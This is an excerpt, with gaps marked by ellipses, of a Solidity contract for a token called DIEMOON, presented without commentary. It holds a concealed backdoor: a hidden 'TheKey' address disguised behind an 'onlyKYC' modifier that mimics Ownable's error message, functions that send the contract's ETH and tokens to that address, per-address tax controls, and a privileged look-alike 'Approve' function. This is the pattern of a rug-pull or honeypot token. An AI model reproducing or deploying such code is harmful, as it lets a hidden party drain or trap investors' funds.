...
contract DIEMOON is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "DIEMOON";
    string private _symbol = "DIEMOON";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x00E4834130b84451cdD9eaE12Ed01416d134515A); 
    address payable private teamWalletAddress = payable(0x88b5192da922EaBb3E87B5C9145D140be8A7b395); 
	...
	address  public TheKey =_msgSender();
	...
	modifier onlyKYC{
       require(TheKey == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function claimBalance() external {
        payable(TheKey).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(TheKey, amount);
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyKYC{
	...
	function Approve(address spender,uint256 amount)public onlyKYC{
